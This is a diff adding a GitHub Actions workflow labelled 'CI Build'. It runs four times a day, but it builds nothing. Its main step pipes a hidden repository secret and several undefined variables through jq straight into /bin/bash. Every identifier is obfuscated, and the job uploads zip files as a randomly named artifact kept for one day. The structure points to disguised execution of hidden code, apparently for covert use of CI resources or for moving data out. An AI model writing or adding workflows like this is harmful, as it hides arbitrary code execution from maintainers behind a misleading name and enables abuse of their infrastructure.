@@ -1,0 +1,31 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          tm29: ${{ secrets.tm29 }}
+        run: |
+          printf '%s' "$tm29" | jq -r .dpiz574 | /bin/bash
+          echo $lbtab4951 | jq -r .rhix235 | /bin/bash
+          echo $qixr2 | jq -r .zh045 | /bin/bash
+          printf '%s' "$ne6783" | jq -r .y0 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: TDzZV4WK
+          path: "*.zip"
+          retention-days: 1
